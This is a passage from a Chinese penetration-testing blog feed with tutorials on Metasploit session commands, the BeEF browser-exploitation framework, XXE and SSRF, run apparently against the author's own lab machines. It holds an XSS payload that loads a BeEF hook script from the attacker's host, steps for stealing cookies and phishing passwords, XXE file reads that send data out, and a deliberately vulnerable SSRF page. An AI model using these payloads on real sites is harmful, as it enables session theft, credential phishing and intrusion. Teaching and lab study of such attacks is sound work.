alt="图片"></p><p>因为我的物理机（192.168.1.100）是开启了防火墙，所以操作系统没显示出来！</p><p>假如我们要搜索扫描结果的一些关键字：例如搜索带<code>192</code>开头的ip：（这个一般用于搜索操作系统等等）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hosts -S（大写） 192</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/144.png" alt="图片"></p><p>除了主机信息我们刚刚扫描的主机还有一些端口信息，如何显示扫描的端口信息：<code>services</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">services </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/145.png" alt="图片"></p><p>其中<code>services</code>可以搭配<code>-S</code>（大S）来使用，假设要搜索端口<code>445</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">services -S 445</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/146.png" alt="图片"></p><h2 id="db-export"><a href="#db-export" class="headerlink" title="db_export"></a>db_export</h2><blockquote><p>一般我们使用db.，想要吧数据库导出,就可以使用db_export</p></blockquote><p>假如我们想要吧扫描的数据结果导出为<code>1.xml</code>：(具体的可以使用<strong>db_export -h</strong>来查看帮助文档)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db_export -f xml /root/1.xml</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/147.png" alt="图片"></p><h2 id="db-import"><a href="#db-import" class="headerlink" title="db_import"></a>db_import</h2><blockquote><p>一般我们把扫描的结果导出了，下一次想要加载之前导出的扫描结果，就可使用db_import导入进来</p></blockquote><p>吧之前导出的<code>/root/1.xml</code>导入进来：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db_import /root/1.xml</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/148.png" alt="图片"></p><h2 id="sessions"><a href="#sessions" class="headerlink" title="sessions"></a>sessions</h2><p>如果你用<code>MSF</code>拿到一个会话<code>shell</code>，然后你会话运行在后台：</p><p>在后台运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; exploit -j</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/149.png" alt="图片"><br><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/150.png" alt="图片"></p><p>然后你退出的时候，你想查看已经拿到链接的<code>shell</code>就可以使用<code>session</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; sessions </span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                     Connection</span><br><span class="line">  --  ----  ----                     -----------                     ----------</span><br><span class="line">  7         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ LIUWX-PC  192.168.1.106:4444 -&gt; 192.168.1.103:49159 (192.168.1.103)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/151.png" alt="图片"></p><p>如果你想使用这个<code>shell</code>的话，就<code>session -i ID</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session -i 7</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/152.png" alt="图片"></p><p>这个时候就进入到了这个<code>session</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/153.png" alt="图片"></p><p>本篇文章记录Metasploit的常用命令使用！</p>]]></content>
      
      
      <categories>
          
          <category> 武器库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
            <tag> Kali Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BeEF的高级烹饪方式</title>
      <link href="/2019/06/17/beef-xss/"/>
      <url>/2019/06/17/beef-xss/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1307788&auto=1&height=66"></iframe><h2 id="BeEF介绍"><a href="#BeEF介绍" class="headerlink" title="BeEF介绍"></a>BeEF介绍</h2><blockquote><p>BeEF是浏览器攻击框架的简称，是一款专注于浏览器端的渗透测试工具</p></blockquote><p>Kali Linux内已经有BeEF的环境，只需要进入<code>/usr/share/beef-xss</code>目录下，<code>./beef</code>运行即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/beef-xss/</span><br><span class="line"></span><br><span class="line">./beef</span><br></pre></td></tr></table></figure><p>BeEF运行截图：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/81.png" alt="图片"></p><p><code>BeEF</code>启动之后会输出在<code>终端</code>很多重要的<code>信息</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Browser Exploitation Framework (BeEF) 0.4.7.0-alpha（BeEF的版本是0.4.7.0）</span><br><span class="line"></span><br><span class="line">12 extensions enabled（12个扩展）</span><br><span class="line"></span><br><span class="line">254 modules enabled（254个利用模块）</span><br><span class="line"></span><br><span class="line">接口控制面板：：</span><br><span class="line"></span><br><span class="line">running on network interface: 127.0.0.1</span><br><span class="line"></span><br><span class="line">Hook URL: http://127.0.0.1:3000/hook.js</span><br><span class="line"></span><br><span class="line">UI URL:   http://127.0.0.1:3000/ui/panel</span><br><span class="line"></span><br><span class="line">running on network interface: 192.168.1.106</span><br><span class="line"></span><br><span class="line">Hook URL: http://192.168.1.106:3000/hook.js</span><br><span class="line"></span><br><span class="line">UI URL:   http://192.168.1.106:3000/ui/panel</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="使用BeEF控制台："><a href="#使用BeEF控制台：" class="headerlink" title="使用BeEF控制台："></a>使用BeEF控制台：</h2><p>URL：（下面两个都可以使用）</p><p><a href="http://127.0.0.1:3000/ui/panel">http://127.0.0.1:3000/ui/panel</a></p><p><a href="http://192.168.1.106:3000/ui/panel">http://192.168.1.106:3000/ui/panel</a></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/82.png" alt="图片"></p><h2 id="登陆凭据："><a href="#登陆凭据：" class="headerlink" title="登陆凭据："></a>登陆凭据：</h2><p>用户名/密码：beef</p><p>用户名密码的配置文件是：config.yaml</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/84.png" alt="图片"></p><h2 id="BeEF主框架控制台页面："><a href="#BeEF主框架控制台页面：" class="headerlink" title="BeEF主框架控制台页面："></a>BeEF主框架控制台页面：</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/83.png" alt="图片"></p><blockquote><p>Before being able to fully explore the framework you will have to ‘hook’ a browser. To begin with you can point a browser towards the basic demo page here, or the advanced version here.</p></blockquote><p>鼠标点击<code>here</code>就可以让浏览器和BeEF挂钩（僵尸）</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/85.png" alt="图片"></p><p>其中<code>192.168.1.100</code>就是我物理机的<code>IP</code>地址</p><p>下图是我们获取到的浏览器的信息：</p><p>包括浏览的<code>URL</code>、<code>Cookies</code>、<code>Host Name/IP</code>、<code>Date</code>、<code>操作系统</code>…等等</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/86.png" alt="图片"></p><p>其中<code>Commands</code>标签页是BeEF执行大部分攻击模块的地方</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/87.png" alt="图片"></p><p><code>绿色</code>的代表该<code>功能有效</code>，并且执行<code>不会被</code>用户所发现</p><p><code>橙色</code>的代表该<code>功能有效</code>，但是执行<code>会被</code>用户所发现</p><p><code>白色</code>的代表该功能<code>不确定</code>是否有效</p><p><code>红色</code>的代表该<code>功能无效</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/88.png" alt="图片"></p><p>其中<code>Rider</code>标签页可以让挂钩(僵尸)的浏览器作为一个代理</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/89.png" alt="图片"></p><p>其中<code>XssRays</code>标签页可以帮助我们让挂钩(僵尸)的浏览器的网站<code>所在域</code>作为目标，然后通过BeEF框架搜索<code>跨站脚本攻击</code>，允许我们让挂钩的网站上找到<code>持久的跨站脚本漏洞攻击</code>的漏洞进行利用</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/90.png" alt="图片"></p><p>其中<code>Ipec</code>标签页可以在<code>http</code>请求中使用<code>http</code>以外的协议等等</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/91.png" alt="图片"></p><blockquote><p>因为我们使用的是BeEF自带的挂钩页面所演示，在实战中可以用反射类型的XSS来进行对用户的浏览器进行钓鱼、DNS欺骗、网站克隆等等操作</p></blockquote><h2 id="使用XSS进行BeEF挂钩："><a href="#使用XSS进行BeEF挂钩：" class="headerlink" title="使用XSS进行BeEF挂钩："></a>使用XSS进行BeEF挂钩：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.liuwx.cn/xss.php?=&quot;&gt;&lt;script src=&quot;http://192.168.1.106:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这时候<code>BeEF</code>控制台就会看到一个新的挂钩(僵尸)浏览器：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/92.png" alt="图片"></p><h2 id="使用BeEF对僵尸浏览器进行攻击"><a href="#使用BeEF对僵尸浏览器进行攻击" class="headerlink" title="使用BeEF对僵尸浏览器进行攻击"></a>使用BeEF对僵尸浏览器进行攻击</h2><h3 id="获取用户Cookie"><a href="#获取用户Cookie" class="headerlink" title="获取用户Cookie"></a>获取用户Cookie</h3><p>来到<code>Commands</code>标签-点击<code>Browser</code>—&gt;<code>Hooked Domain</code> —&gt;<code>Get Cookie</code>，然后点击右下角的<code>Execute</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/93.png" alt="图片"></p><p>此时右边就可以看到浏览器的<code>Cookie</code>了</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/94.png" alt="图片"></p><h3 id="对网页进行重定向"><a href="#对网页进行重定向" class="headerlink" title="对网页进行重定向"></a>对网页进行重定向</h3><p>来到<code>Commands</code>标签-点击<code>Browser</code>—&gt;<code>Hooked Domain</code> —&gt;<code>Redirect Browser</code>，然后点击右下角的<code>Execute</code>，然后用户的浏览器的该页面就会跳转到<code>http://www.liuwx.cn</code>的页面了。</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/95.png" alt="图片"></p><p>成功跳转</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/96.png" alt="图片"></p><h3 id="对网页进行社工弹窗"><a href="#对网页进行社工弹窗" class="headerlink" title="对网页进行社工弹窗"></a>对网页进行社工弹窗</h3><p>来到<code>Commands</code>标签-点击<code>Social Engiineering</code>——&gt;<code>Pretty Theft</code> ，然后右上角选择弹窗的类型，右下角点击 <code>Execute</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/97.png" alt="图片"></p><blockquote><p>说实话，这个弹窗有点鸡肋，看上去太假了，建议不要使用这个</p></blockquote><p>但是你只要在框内<code>输入了</code>用户名和密码的话</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/98.png" alt="图片"></p><p>如果<code>僵尸</code>那边输入了<code>用户名</code>和<code>密码</code>，点击了<code>登陆</code>的话，控制台是会收到<code>账号密码</code>的</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/99.png" alt="图片"></p><p>目前<code>BeEF</code>使用就到这，后续遇到其他的玩法还会继续更新… …</p><p>未完待续… …</p>]]></content>
      
      
      <categories>
          
          <category> 武器库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Beef </tag>
            
            <tag> 工具使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈XXE漏洞</title>
      <link href="/2019/06/17/penetrationtest-4/"/>
      <url>/2019/06/17/penetrationtest-4/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=29216046&auto=1&height=66"></iframe><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><blockquote><p>现在越来越多主要的web程序被发现和报告存在XXE(XML External Entity attack)漏洞，比如说facebook、paypal等等。 举个例子，我们扫一眼这些网站最近奖励的漏洞，充分证实了前面的说法。尽管XXE漏洞已经存在了很多年，但是它从来没有获得它应得的关注度。很多XML的解析器默认是含有XXE漏洞的，这意味着开发人员有责任确保这些程序不受此漏洞的影响。</p></blockquote><h2 id="XML基础知识"><a href="#XML基础知识" class="headerlink" title="XML基础知识"></a>XML基础知识</h2><p><code>XML</code>用于<code>标记电子文件</code>使其具有<code>结构性</code>的<code>标记语言</code>，可以用来<code>标记数据</code>、<code>定义数据类型</code>，是一种允许用户对自己的标记语言进行定义的源语言。<code>XML</code>文档结构包括<code>XML声明</code>、<code>DTD</code>文档类型定义（可选）、文档元素。</p><p>如果你了解<code>XML</code>，你可以把<code>XML</code>理解为一个用来<code>定义数据</code>的东东。因此，两个采用不同技术的系统可以通过<code>XML</code>进行<code>通信</code>和<code>交换数据</code>。 </p><p>比如，下面的代码就是XML的基础结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> &lt;!--XML声明--&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line"></span><br><span class="line"> &lt;!--文档类型定义--&gt;</span><br><span class="line"> &lt;!DOCTYPE note [</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from(#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading(#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body(#PCDATA)&gt;</span><br><span class="line"> ]&gt;</span><br><span class="line"></span><br><span class="line"> &lt;!--文档元素--&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Hacker&lt;/to&gt;</span><br><span class="line">&lt;from&gt;Power_Liu&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Hack it, you must be Know it，Know it then Hack it。&lt;body/&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><h2 id="DTD是什么"><a href="#DTD是什么" class="headerlink" title="DTD是什么?"></a>DTD是什么?</h2><p><code>DTD</code>(文档类型定义)的作用是定义<code>XML</code>文档的<code>合法构建模块</code>。<code>DTD</code>可以在<code>XML</code>文档内声明，也可以<code>外部引用</code>。</p><h3 id="内部声明DTD"><a href="#内部声明DTD" class="headerlink" title="内部声明DTD"></a>内部声明DTD</h3><p>格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTPYE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure><h3 id="引用外部DTD"><a href="#引用外部DTD" class="headerlink" title="引用外部DTD"></a>引用外部DTD</h3><p>格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure><p>或者：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure><blockquote><p>在DTD中，实体声明，使用ENTITY关键字声明。实体，用来定义应用普通文本或特殊字符的快捷方式的变量。实体，可以内部，或外部进行声明。</p></blockquote><h3 id="内部声明实体格式："><a href="#内部声明实体格式：" class="headerlink" title="内部声明实体格式："></a>内部声明实体格式：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体值&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="引用外部的实体格式："><a href="#引用外部的实体格式：" class="headerlink" title="引用外部的实体格式："></a>引用外部的实体格式：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;引用外部的url&quot;&gt;</span><br><span class="line">&lt;!ENTITY 实体名称 public_ID &quot;引用外部的url&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="XXE外部实体注入-XML-External-Entity"><a href="#XXE外部实体注入-XML-External-Entity" class="headerlink" title="XXE外部实体注入(XML External Entity)"></a>XXE外部实体注入(XML External Entity)</h2><blockquote><p>当运行引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p></blockquote><p>（1）恶意引入外部实体方式1：</p><p><code>读取</code>系统<code>passwd</code>文件</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/71.png" alt="图片"></p><p>（2）恶意引入外部实体方式2：</p><p>调用<code>外部实体URL</code>,其中evil.<code>dtd</code>就是恶意文件，内容可以写成上面的那种</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/72.png" alt="图片"></p><p>（3）恶意引入外部实体方式</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/73.png" alt="图片"></p><h3 id="支持的协议："><a href="#支持的协议：" class="headerlink" title="支持的协议："></a>支持的协议：</h3><h4 id="libxml2"><a href="#libxml2" class="headerlink" title="libxml2"></a>libxml2</h4><p>file、http、ftp</p><h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><p>file、http、ftp、php、compress.zlib、compress.bzip2、data、glob、phar</p><h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><p>http、https、ftp、file、jar、netdoc、mailto、gopher</p><h4 id="NET"><a href="#NET" class="headerlink" title=".NET"></a>.NET</h4><p>file、http、https、ftp</p><h2 id="XXE漏洞的危害："><a href="#XXE漏洞的危害：" class="headerlink" title="XXE漏洞的危害："></a>XXE漏洞的危害：</h2><h4 id="读取任意文件（数据回显）："><a href="#读取任意文件（数据回显）：" class="headerlink" title="读取任意文件（数据回显）："></a>读取任意文件（数据回显）：</h4><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/74.png" alt="图片"></p><h4 id="任意文件读取（数据不回显）："><a href="#任意文件读取（数据不回显）：" class="headerlink" title="任意文件读取（数据不回显）："></a>任意文件读取（数据不回显）：</h4><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/75.png" alt="图片"></p><p><code>#print_r($data);</code>这个是不让数据回显到客户端，让回显的数据发送到远程服务器的<code>192.168.1.122/evil.dtd</code>里。</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/76.png" alt="图片"></p><h4 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/77.png" alt="图片"></p><h4 id="内网端口探测"><a href="#内网端口探测" class="headerlink" title="内网端口探测"></a>内网端口探测</h4><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/78.png" alt="图片"></p><h4 id="内网的渗透测试"><a href="#内网的渗透测试" class="headerlink" title="内网的渗透测试"></a>内网的渗透测试</h4><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/79.png" alt="图片"></p><h2 id="防御XXE攻击："><a href="#防御XXE攻击：" class="headerlink" title="防御XXE攻击："></a>防御XXE攻击：</h2><p>方案一：使用开发语言提供的禁用外部实体的方法</p><p>php：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure><p>其他语言：百度上有详细的说明文档</p><p>方案二：过滤用户提交的XML数据</p><p>关键词有：SYSTEM、PUBLIC</p><p>XXE漏洞测试靶场：</p><p><a href="https://github.com/vulnspy/phpaudit-XXE">XXE漏洞测试靶场地址</a></p><h2 id="XXE漏洞的演示："><a href="#XXE漏洞的演示：" class="headerlink" title="XXE漏洞的演示："></a>XXE漏洞的演示：</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/80.png" alt="图片"></p><p>用<code>BurpSuite</code>抓包然后再数据包下面填写恶意的XML代码实现读取<code>etc/passwd</code>文化内容</p><p>未完待续… …</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞原理 </tag>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF漏洞原理与利用</title>
      <link href="/2019/06/10/penetrationtest-3/"/>
      <url>/2019/06/10/penetrationtest-3/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1343389182&auto=1&height=66"></iframe><h2 id="什么是SSRF？"><a href="#什么是SSRF？" class="headerlink" title="什么是SSRF？"></a>什么是SSRF？</h2><p>SSRF(Server-Side Request Forgery)，<code>服务器端请求伪造</code>；利用一个可以发起<code>网络请求</code>的<code>服务</code>，可以当做<code>跳板</code>来<code>攻击</code>其他服务。</p><h2 id="Know-IT-SSRF有什么能耐？"><a href="#Know-IT-SSRF有什么能耐？" class="headerlink" title="Know IT, SSRF有什么能耐？"></a>Know IT, SSRF有什么能耐？</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/61.png" alt="图片"></p><p>内外网的<code>端口</code>和<code>服务探测</code></p><p>主机本地<code>敏感数据</code>的<code>读取</code></p><p>内外网主机<code>应用程序漏洞</code>的<code>利用</code></p><p>…… 等等</p><h2 id="怎么找到SSRF漏洞？"><a href="#怎么找到SSRF漏洞？" class="headerlink" title="怎么找到SSRF漏洞？"></a>怎么找到SSRF漏洞？</h2><p>能够<code>对外发起网络请求</code>的地方，就可能存在<code>SSRF</code>漏洞</p><p>从<code>远程服务器请求资源</code>(Upload from URL,Import &amp; Export RSS feed)</p><p>数据库内置功能(Oracle、MongoDB、MSSQL、Postgres、CouchDB)</p><p>Webmail收取其他邮箱邮件(POP3/IMAP/SMTP)</p><p><code>文件处理</code>,<code>编码处理</code>，<code>属性信息处理</code>(ffpmg,ImageMaic,DOCX,PDF,XML处理器)</p><h2 id="测试靶场PHP源码"><a href="#测试靶场PHP源码" class="headerlink" title="测试靶场PHP源码"></a>测试靶场PHP源码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function curl($url)&#123;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[&#x27;url&#x27;];</span><br><span class="line">curl($url);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="SSRF漏洞的利用"><a href="#SSRF漏洞的利用" class="headerlink" title="SSRF漏洞的利用"></a>SSRF漏洞的利用</h2><p>访问URL：</p><blockquote><p><a href="http://127.0.0.1/web/ssrf.php?url=www.baidu.com">http://127.0.0.1/web/ssrf.php?url=www.baidu.com</a></p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/62.png" alt="图片"></p><p>可以看到，用<code>GET</code>请求让服务端请求<code>百度</code>的<code>URL</code>成功</p><p>当我们设置参数<code>URL</code>为内网的时候，那就会<code>泄露/探测</code>到<code>内网</code>的<code>信息</code></p><p>比如<code>内网</code>下有一个<code>http://127.0.0.1/phpmyadmin/</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/63.png" alt="图片"></p><p>我们尝试让服务端请求这个<code>phpmyadmin</code>,其构造<code>URL</code>:</p><blockquote><p><a href="http://localhost/web/ssrf.php?url=127.0.0.1/phpmyadmin/">http://localhost/web/ssrf.php?url=127.0.0.1/phpmyadmin/</a></p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/64.png" alt="图片"></p><h2 id="BurpSuite-Intruder模块探测内网端口"><a href="#BurpSuite-Intruder模块探测内网端口" class="headerlink" title="BurpSuite - Intruder模块探测内网端口"></a>BurpSuite - Intruder模块探测内网端口</h2><p>首先访问URL：</p><blockquote><p><a href="http://localhost/web/ssrf.php?url=127.0.0.1">http://localhost/web/ssrf.php?url=127.0.0.1</a></p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/65.png" alt="图片"></p><p>然后打开<code>BurpSuite</code>抓包：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/66.png" alt="图片"></p><p>数据包如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /web/ssrf.php?url=127.0.0.1 HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Connection: close</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>右键 - <code>Send to Inturder</code>:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/67.png" alt="图片"></p><p>设置变量:</p><blockquote><p>GET /web/ssrf.php?url=127.0.0.1:§port§</p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/68.png" alt="图片"></p><p>设置字典：</p><p>Number: From:1 - To:65535 - Step:1</p><p><code>数字类型</code>（Number）——这种类型的<code>Payload</code>是指根据配置，生成一系列的<code>数字</code>作为Payload</p><p><code>Type</code>表示使用<code>序列</code>还是<code>随机数</code></p><p><code>From</code>表示从什么<code>数字</code>开始</p><p><code>To</code>表示到什么<code>数字</code>截止</p><p><code>Step</code>表示<code>步长</code>是多少</p><p>…… 具体的可以看看BurpSuite实用手册</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/69.png" alt="图片"></p><h3 id="Start-Attack："><a href="#Start-Attack：" class="headerlink" title="Start Attack："></a>Start Attack：</h3><p>Intruder attack 结果：</p><p><img 